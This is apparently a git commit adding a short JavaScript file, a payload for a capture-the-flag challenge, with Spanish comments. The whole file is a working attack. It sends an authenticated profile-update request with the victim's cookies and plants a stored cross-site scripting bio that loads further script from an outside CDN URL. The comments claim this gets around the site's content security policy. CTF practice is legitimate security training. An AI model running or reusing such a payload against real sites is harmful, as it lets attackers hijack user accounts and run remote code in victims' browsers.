fe07bec321a451cf042c3f21ec0b9b52b6f7cb17
Lucca Musomecci <74316806+notluken@users.noreply.github.com>
2025-10-05 18:51:51 -0300

    Create a.js

---
+++ a.js
@@ -0,0 +1,15 @@
+(function() {
+  var form = new FormData();
+    // Reemplaza '¡Biografía de Jeni comprometida!' por el texto del CTF
+  form.append('bio', '<script src="https://cdn.jsdelivr.net/gh/notluken/vtf@main/z.js"></script>'); 
+  form.append('profile_pic', new Blob([''], {type: 'application/octet-stream'}), '');
+
+    // ¡La petición es al dominio local, evitando el CSP!
+  fetch('/profile', { 
+    method: 'POST',
+    body: form,
+    credentials: 'include'
+  }).then(response => {
+    console.log('XSS Exitoso: Biografía de Jeni cambiada.');
+  }).catch(console.error);
+})();
